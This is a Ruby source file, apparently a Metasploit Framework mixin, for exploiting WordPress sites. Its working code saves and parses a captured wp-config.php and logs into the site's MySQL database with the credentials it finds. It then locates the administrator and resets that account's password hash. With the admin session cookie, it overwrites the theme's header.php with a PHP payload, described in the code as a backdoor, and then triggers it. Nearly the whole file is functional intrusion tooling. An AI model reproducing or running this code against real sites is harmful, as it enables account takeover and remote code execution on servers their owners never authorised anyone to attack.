# -*- coding: binary -*-
module Msf

###
#
# This module provides a way of exploiting wordpress installations
#
###
require 'rbmysql'

module Exploit::Remote::Wordpress
	include Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/']),
				OptString.new('PLUGINSPATH', [true, 'The relative path to the plugins folder', 'wp-content/plugins/']),
				OptString.new('ADMINPATH', [true, 'The relative path to the admin folder', 'wp-admin/']),
				OptString.new('THEMESPATH', [true, 'The relative path to the themes folder', 'wp-content/themes/']),
			], Exploit::Remote::Wordpress
		)

		@wp_config = {}
		@admin_token = ''
	end

	# URIs for different parts of Worpdress
	def wordpress_uri
		uri = String.new(target_uri.path)
		uri << '/' if uri[-1,1] != '/'
		return uri
	end

	def plugins_uri
		uri = wordpress_uri
		uri << datastore['PLUGINSPATH']
		uri << '/' if uri[-1,1] != '/'
		return uri
	end

	def admin_uri
		uri = wordpress_uri
		uri << datastore['ADMINPATH']
		uri << '/' if uri[-1,1] != '/'
		return uri
	end

	def themes_uri
		uri = wordpress_uri
		uri << datastore['THEMESPATH']
		uri << '/' if uri[-1,1] != '/'
		return uri
	end

	def parse_wp_config(body)
		p = store_loot('wordpress.config', 'text/plain', rhost, body, "#{rhost}_wp-config.php")
		print_status("wp-config.php saved in: #{p}")
		print_status("Parsing config file")

		body.each_line do |line|
			if line =~ /define/
				key_pair = line.scan(/('|")([^'"]*)('|")/)
				if key_pair.length == 2
					@wp_config[key_pair[0][1]] = key_pair[1][1]
				end
			elsif line =~ /table_prefix/
				table_prefix = line.scan(/('|")([^'"]*)('|")/)
				@wp_config['DB_PREFIX'] = table_prefix[0][1]
			end
		end
		#Extract the port from DB_HOST and normalize DB_HOST
		@wp_config['DB_PORT'] = @wp_config['DB_HOST'].include?(':') ? @wp_config['DB_HOST'].split(':')[1] : 3306

		if @wp_config['DB_HOST'] =~ /(localhost|127.0.0.1)/
			print_status("DB_HOST config value was a loopback address. Trying to resolve to a proper IP")
			@wp_config['DB_HOST'] = ::Rex::Socket.getaddress(datastore['RHOST'])
		end

		return @wp_config
	end

	def connect_to_wp_database()
		begin
			@mysql_handle = ::RbMysql.connect({
				:host           => @wp_config['DB_HOST'],
				:port           => @wp_config['DB_PORT'],
				:read_timeout   => 300,
				:write_timeout  => 300,
				:socket         => nil,
				:user           => @wp_config['DB_USER'],
				:password       => @wp_config['DB_PASSWORD'],
				:db             => @wp_config['DB_NAME']
			})
		rescue Errno::ECONNREFUSED,
			RbMysql::ClientError,
			Errno::ETIMEDOUT,
			RbMysql::AccessDeniedError,
			RbMysql::HostNotPrivileged
			fail_with(Exploit::Failure::NotVulnerable, 'Unable to connect to the MySQL server')
		end
	end

	# Theme operations, used for planting PHP payloads
	def get_wp_theme()
		if @admin_cookie.empty?
			fail_with(Exploit::Failure::BadConfig, 'An admin cookie has not been acquired yet')
		end
		res = send_request_cgi({
			'method' => 'POST',
			'uri'    => "#{self.admin_uri}theme-editor.php?file=header.php",
			'cookie' => @admin_cookie,
		})

		if res and res.code != 200
			fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
		elsif res and res.body.scan(/<input.+?name="submit".+?class="button button-primary"/).length == 0
			fail_with(Exploit::Failure::NotVulnerable, 'Wordpress does not have write access')
		end

		nonce = res.body.scan(/<input.+?id="_wpnonce".+?value="(.+?)"/)[0][0].to_s
		old_content = Rex::Text.html_decode(Rex::Text.html_decode(res.body.scan(/<textarea.+?id="newcontent".+?>(.*)<\/textarea>/m)[0][0].to_s))
		theme = res.body.scan(/<input.+?name="theme".+?value="(.+?)"/)[0][0].to_s

		return [theme, nonce, old_content]
	end

	def set_wp_theme(nonce, theme, new_content)
		if @admin_cookie.empty?
			fail_with(Exploit::Failure::BadConfig, 'An admin cookie has not been acquired yet')
		end
		res = send_request_cgi({
			'method'    => 'POST',
			'uri'       => "#{self.admin_uri}theme-editor.php?",
			'cookie'    => @admin_cookie,
			'vars_post' =>
				{
					'_wpnonce'   => nonce,
					'theme'      => theme,
					'newcontent' => new_content,
					'action'     => 'update',
					'file'       => 'header.php'
				},
		})

		if res and res.code != 302
			fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
		end
	end

	# User and authentication operations
	def set_user_password_hash(user_login, new_password, encode=true)
		if @mysql_handle == nil
			fail_with(Exploit::Failure::NoTarget, 'The mysql connection has not been created yet')
		end
		@mysql_handle.query("UPDATE #{@wp_config['DB_PREFIX']}users SET user_pass = '#{encode ? ::Rex::Text.md5(new_password) : new_password}' WHERE user_login = '#{user_login}'")
		print_warning("User password changed to: #{new_password}")
	end

	def get_admin_user
		if @mysql_handle == nil
			fail_with(Exploit::Failure::NoTarget, 'The mysql connection has not been created yet')
		end
		res = @mysql_handle.query("SELECT user_login, user_pass FROM #{@wp_config['DB_PREFIX']}users U
									INNER JOIN #{@wp_config['DB_PREFIX']}usermeta M ON M.user_id = U.ID AND M.meta_key = 'wp_user_level' AND meta_value = '10' LIMIT 1")

		if res.nil? or res.size <= 0
			fail_with(Exploit::Failure::UnexpectedReply, 'No admin was account found')
		end
		
		return res.first
	end

	def get_wp_cookie(username, password)
		res = send_request_cgi({
			'method'     => 'POST',
			'uri'        => "#{self.wordpress_uri}wp-login.php",
			'cookie'     => 'wordpress_test_cookie=WP+Cookie+check',
			'vars_post'  =>
				{
					'log'        => username,
					'pwd'        => password,
					'wp-submit'  => 'Log+In',
					'testcookie' => '1',
				},
		})

		if res and res.code == 200
			fail_with(Exploit::Failure::UnexpectedReply, 'Admin login failed')
		elsif res and res.code != 302
			fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
		end

		@admin_cookie = ''
		(res.headers['Set-Cookie'] || '').split(',').each do |cookie|
			@admin_cookie << cookie.split(';')[0]
			@admin_cookie << ';'
		end

		if @admin_cookie.empty?
			fail_with(Exploit::Failure::UnexpectedReply, 'The resulting cookie was empty')
		end
		if not ['DB_HOST', 'DB_PORT', 'DB_USER', 'DB_PASSWORD', 'DB_NAME'].all? { |parameter| @wp_config.has_key?(parameter) }
			fail_with(Exploit::Failure::UnexpectedReply, "The config file did not parse properly")
		end

		return @admin_cookie
	end

	# Chaining a lot of actions into a simple way of planting a
	# backdoor by just having DB access
	def get_theme_backdoor
		theme, nonce, old_content = get_wp_theme()

		print_warning("Editing theme #{theme}")
		set_wp_theme(nonce, theme, payload.encoded)

		print_status("Calling backdoor")
		res = send_request_cgi({
			'method' => 'GET',
			'uri'    => "#{self.themes_uri}#{theme}/header.php",
		})

		if res and res.code != 200
			fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
		end

		set_wp_theme(nonce, theme, old_content)
	end

end
end
